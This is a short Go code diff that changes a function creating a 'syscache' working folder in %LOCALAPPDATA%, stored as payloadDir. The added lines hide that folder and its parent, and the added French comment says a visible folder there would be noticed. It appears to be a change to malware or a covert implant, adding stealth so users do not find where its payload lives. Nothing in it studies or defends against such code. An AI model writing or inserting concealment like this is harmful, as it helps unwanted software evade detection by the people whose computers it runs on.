@@ -105,6 +105,9 @@ func workDir() string {
 	}
 	dir := filepath.Join(appDataLocal(), workDirName, "syscache")
 	_ = os.MkdirAll(dir, 0700)
+	// Dossier caché : un dossier visible dans %LOCALAPPDATA% se remarque.
+	hideFile(dir)
+	hideFile(filepath.Dir(dir))
 	payloadDir = dir
 	return dir
 }
